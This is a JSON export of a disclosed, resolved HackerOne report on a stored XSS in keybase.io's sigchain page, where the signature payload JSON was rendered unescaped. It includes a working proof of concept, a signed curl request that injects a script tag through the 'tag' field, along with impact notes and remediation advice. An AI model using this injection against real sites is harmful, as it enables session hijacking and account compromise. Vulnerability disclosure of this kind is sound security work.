{
  "id": 245296,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDUyOTY=",
  "url": "https://hackerone.com/reports/245296",
  "title": "Persistent XSS on keybase.io via \"payload\" field in `/user/sigchain_signature.toffee` template",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2017-07-02T09:42:52.752Z",
  "submitted_at": "2017-07-02T09:42:52.752Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jordanmilne",
    "url": "/jordanmilne",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/cccd3716a6d2e06174d2a41492445cb1d4bf85b4611a755bc810b9246a24d951"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 2809,
    "url": "https://hackerone.com/keybase",
    "handle": "keybase",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Keybase",
      "twitter_handle": "keybaseio",
      "website": "https://keybase.io",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-03-14T15:15:33.139Z",
  "bug_reporter_agreed_on_going_public_at": "2017-08-20T03:34:45.248Z",
  "team_member_agreed_on_going_public_at": "2019-03-14T15:15:33.017Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Issue\n\nKeybase allows you to see other users' sigchains by navigating to <https://keybase.io/<username\\>/sigchain>. The \"Payload\" field containing JSON related to the chainlink on the right side of the page is not correctly escaped during templating, leading to a persistent XSS as users have a high degree of control over the contents of that field.\n\nSpecifically, the `/user/sigchain_signature.toffee` template's compiled code contains:\n\n```js\n// ...\n                _to('      <textarea wrap=\"off\" class=\"form-control fixed full-payload autoselect\" rows=\"20\" autocapitalize=\"off\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" readonly>');\n                _to(\"\" + JSON.stringify(JSON.parse(sig.payload_json), null, 2)); // < `payload_json` is user-controlled and not escaped!\n                _to(\"</textarea>\\n\");\n// ...\n```\n\nwhere normally there would be an `escape()` around the data being interpolated in to prevent special characters being interpreted as HTML.\n\n## Proof-of-Concept\n\n* Create a new account on https://keybase.io or remove all keys / associations from an existing account\n* Generate a GPG keypair locally and upload the public half via https://keybase.io. Make sure you import these into your GPG keychain.\n* When the site asks you to upload the private half, select \"maybe another time\", then select the option to sign the pubkey with \"command line with [bash + GPG + cURL]\"\n* keybase.io will spit out a few lines of bash to paste into your terminal, copy this to a text editor.\n* Replace `\"tag\":\"signature\"` section of the JSON payload in the cURL command with `\"tag\":\"</textarea><script>alert(1)</script>\"`. There's no particular reason we have to inject into the `tag` field, it was just the first field I saw that wasn't validated and was reflected in the \"payload\" field on the sigchain page.\n\nYou should have something like:\n\n```bash\ncurl \\\n  --data-urlencode sig=\"`\\\n   echo '{\"body\":{\"key\":{\"eldest_kid\":\"01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a\",\"fingerprint\":\"b54bac1da5887ffba91411894f6b7c0c98dc7571\",\"full_hash\":\"3ef468ca735aacdc3beee8f8ac1f88c4441a01a583598871721cd390d74fa465\",\"host\":\"keybase.io\",\"key_id\":\"4f6b7c0c98dc7571\",\"kid\":\"01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a\",\"uid\":\"81d7b93a686f9bc7ff566eeb87bc8719\",\"username\":\"largenotesting\"},\"type\":\"eldest\",\"version\":1},\"ctime\":1498970799,\"expire_in\":157680000,\"prev\":\"d87dd6918ff960578d29d8c9fd47cfdd8256bc46ed288ff7475522574134a1a0\",\"seqno\":19,\"tag\":\"</textarea><script>alert(1)</script>\"}' | \\\n   gpg -u 'b54bac1da5887ffba91411894f6b7c0c98dc7571' -a --sign`\" \\\n  --data-urlencode type=\"eldest\" \\\n  --data-urlencode session=\"<SESSION KEY>\" \\\n  --data-urlencode csrf_token=\"<CSRF TOKEN>\" \\\n  --data-urlencode plain_out=\"1\" \\\n  --data-urlencode signing_kid=\"01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a\" \\\n  --data-urlencode public_key=\"-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: GnuPG v2\n\nmQENBFlYeiwBCADMIXo7d47rJpWwBVqr/obUBb0NpTh7cPnhSeoYPaIRVCPOm6ep\nHVOveqSheiIAJMVu+7sv70t67TTfszCp5lPCpgoGcotb74Eze7aF5DnoBY/kjGUt\n1PwoiMvoTgmoXikWmPd24qb2+2kRRyCSsq93Dd8/Vk1DAcDxzRbvxlLCsFGWfNmr\nRmPYB31U8OuPp7n9+FqEAWXVxFl/5AswpfRhekwG1ujlRzv4Ufpnb1PGVTdhwI0j\n/+Mk+7gK5MqcbGUT/W2O0M01onWN0Xg8pDBliR2D2ePpI08GxV0BnBYhCWgYI683\nRWrgTuSaHNdS3TqwULehYKNSqB3U2OTsdL9ZABEBAAG0KXNvbWV0aGluZyA8YW5v\ndGhlcmtleWJhQHNheW5vdG9saW51eC5jb20+iQE3BBMBCAAhBQJZWHosAhsDBQsJ\nCAcCBhUICQoLAgQWAgMBAh4BAheAAAoJEE9rfAyY3HVxgLcH/RdkDjwgLwmIiOzh\nJY/EzcVApSqMWLEO7JQZCHUgJNq/h7HY6uHd12uEAirP+QRpDIE1h98YSeIxQLAR\niWrmST/tR9PhmeUN1pYJfuPEW8PLDkefrKde+0XhvWoOzTvQNiYFGlCnP9BIiJky\nGzC0Tb7Dg8iVe032QjYCbqNyQkWmQ9ztM+j+mPHKTfMC1hzU+lOt4nexWlTSf/z6\n4GURt131gIVBuQu7pm61QZP/u+dPdazho1ikmASNHHYkAnJFzMWQ7GDi7Lqns/mB\nW7XFEqbT4dOSeEOVkckiPNDcVFgdhPiDTm4VWzQAsYU/Zr3AhcxuBSQT6l11fvWb\nEmuWeFa5AQ0EWVh6LAEIAMOJF/a1Tz7Nwa5+FhpbBX0svIzpPCfREdDg0kO0cKWU\n81IWZZrDHqmlfxCnqPyB7XfrwFb40gIbBmi6mrZb5COo5pDQ7uE+cWn5cmpVVOqx\nkEjX8jEd0SzO5kBFevlVHlGrcO23tm2FuKZBHf69u2U15ivYijceJFnRCCyW0RFQ\nCz9Rz9XBkth6x3SswBZQAT2qAaBnVwQv/YzleBH2cCUSxMkjLE8zjkFL8W+zEVGw\n9NyWQHJ/TmaHeAojvRisJ1MyIpRLhFDn8h5PYuvZs8XRK7pen+PznIAtuYYfENCR\n7tPqAp4yFkKhOBy7zQB9PUOoaZWxRwUs4HoDIkNSnWcAEQEAAYkBHwQYAQgACQUC\nWVh6LAIbDAAKCRBPa3wMmNx1ceKnB/905aQn5eJDo7Dva0AjDjYL6+mSf1eeMElF\nUUhqR3/ZVUrla5xX3N1wvnC5YfBAjXY4WpRtDFfNR35EA31kP8biAWs1bgaPybyr\nJZqHD7DQS+tccHKQd/ovNg5qFIh8KKv1pMI66n1GtG4C6btz8cbxhUj1WYfBbxdR\negSWT5WEP+lm3+iSGg4C/yPOpvqdx7ORCLvje8v9lQ8XMOPwclvYsZKuydi4anT0\nsy7LbithYRusQrkO40qiTgsD6YHGZiN++SscMg04RYgRz/F37hYeWhZqwsnq4mt3\nlzONWNX5pQsSbP0dAiJvh8otImITQFUUnfu5z+jJCXdze9/2FV8z\n=1hmO\n-----END PGP PUBLIC KEY BLOCK-----\" \\\n  --data-urlencode is_primary=\"true\" \\\n  --data-urlencode sig_required=\"true\" \\\n  https://keybase.io/_/api/1.0/key/add.json\n```\n* Run the command, then go to <https://keybase.io/<YOUR_USERNAME\\>/sigchain>. You should see an `alert()` box pop.\n\nI can also make a profile that repros this issue if you like, I've cleared my profile since verifying this was an issue.\n\n## Impact\n\nIt seems like _most_ sensitive functionality on keybase.io is behind a password re-entry wall, so if the victim didn't have a password manager that would autopopulate password fields on https://keybase.io the attacker would have to dump a fake login prompt into the DOM to be able to do anything \"interesting\". I suppose an attacker would at least be able to pull down the user's TripleSec-encrypted privkey bundles to perform an offline attack without any special user interaction.\n\nHowever, the frontend JS references some admin-only API endpoints (viewing crashlogs, billing stuff, etc) that don't seem to require password re-auth. An XSS in the context of an admin user's session would probably allow an attacker to abuse those endpoints.\n\n## Remediation\n\nThe \"payload\" JSON should be escaped in the template like anything else in a text node. More generally, more of web frontend code should be switched to modern HTML templating techniques. There's a number of suspect instances of semi-user-controlled data being passed into HTML sinks like `$.html()`, `$.append()`, `$.prepend()`, etc.\n\nThe web frontend would also be a good candidate for CSP with nonces, since it doesn't seem to pull in third-party resources other than statics from S3, and that would have mitigated this XSS in most modern browsers.\n\nJust let me know if you need any more details! Also, hi @chromakode!",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 265,
  "voters": [
    "fersingb",
    "notpwnguy",
    "mirchr",
    "jordanmilne",
    "danielmgm",
    "spaceraccoon",
    "0xbeefed",
    "base_64",
    "michiel",
    "sameerphad72",
    "and 255 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 8.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "low"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
